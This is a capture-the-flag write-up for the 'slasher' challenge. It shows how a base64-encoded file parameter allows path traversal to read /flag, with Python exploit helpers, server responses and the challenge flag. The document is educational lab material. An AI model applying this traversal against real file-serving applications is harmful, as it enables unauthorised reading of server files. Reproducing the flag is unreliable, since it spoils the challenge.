# slasher

## Write-up

- Register a user `a:a`

- Indicate filename (`test` for example) and upload file

- Notice that the URL of the uploaded file ends with a GET parameter : `?file=dGVzdA==`

- `dGVzdA==` could be a base64 encoded string, and effectively it decodes to `test` (the filename indicated)

- One of the characters used by the base64 charset is `/`, a dangerous character for file paths

- Since the goal is to read `/flag`, let's try to provide a filename that base64 encodes to `/flag`. In other words, let's try to base64 decode `/flag` string

- In python :  

```python
>>> import base64
>>> base64.b64decode('/flag')
binascii.Error: Incorrect padding
>>> base64.b64decode('////flag')
b'\xff\xff\xff~V\xa0'
```

Since a base64 encoded string has to verify `(length * 6) % 8 == 0`, we prepend a few slashes.

- To make exploitation easier we can write a few helper functions :  

```python
from pwn import *
import requests
from sys import argv, exit, stderr
import os

BASE_URL = "http://127.0.0.1:3000"
UPLOAD_URL = f"{BASE_URL}/upload"
LOGIN_URL = f"{BASE_URL}/login"
UPLOAD_FILE = "/tmp/upload"
USERNAME = "a"
PASSWORD = "a"

s = requests.Session()

def log_response(resp):
    log.info(f"resp.text: {resp.text}")
    log.info(f"resp.status_code: {resp.status_code}")

def upload(filename, content, verbose=False):
    with open(UPLOAD_FILE, 'wb') as f:
        f.write(content)
    with open(UPLOAD_FILE, 'rb') as f:
        files = {"file": f}
        data = {"filename": filename}
        resp = s.post(url=UPLOAD_URL, files=files, data=data)
        verbose and log.info(f"request.body: {resp.request.body}")
        verbose and log_response(resp)

def login(username, password, verbose=False):
    data = {
        "username": username,
        "password": password,
    }
    resp = s.post(url=LOGIN_URL, data=data)
    verbose and log_response(resp)
```

- Let's try to upload a file with filename `\xff\xff\xff~V\xa0` :  

```python
login(USERNAME, PASSWORD)
filename = b64d(b"////flag")
upload(filename, b"SOME CONTENT", verbose=True)
```

- HTTP Response (important part) :  

```html
        <div class="alert alert-info alert-dismissible fade show mt-3 w-50" role="alert">
          Filename: ���~V�
          <button type="button" class="btn close" data-dismiss="alert" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>

        <div class="alert alert-danger alert-dismissible fade show mt-3 w-50" role="alert">
          Error: &#39;latin-1&#39; codec can&#39;t encode characters in position 0-2: ordinal not in range(256)
          <button type="button" class="btn close" data-dismiss="alert" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
```

We can see there is an encoding error : `Error: 'latin-1'; codec can't encode characters in position 0-2: ordinal not in range(256)`. The server is probably trying to encode the filename in `latin-1` encoding.

- Before uploading the file, let's decode the filename from `latin-1` encoding :  

```python
login(USERNAME, PASSWORD)
filename = b64d(b"////flag").decode('latin-1')
upload(filename, b"SOME CONTENT", verbose=True)
```

- We get a 500 internal server error, one could guess it tried to overwrite a read-only `/flag` file

- When heading back to `/` we see `ÿÿÿ~V` among the uploaded files and it is pointing to `/?file=////flag`

- After downloading the file, we can read the flag : `shellmates{d3F1Ni73Ly_nOT_uRls4Fe_Base64}`

Full exploit [here](solve.py).

## Flag

`shellmates{d3F1Ni73Ly_nOT_uRls4Fe_Base64}`
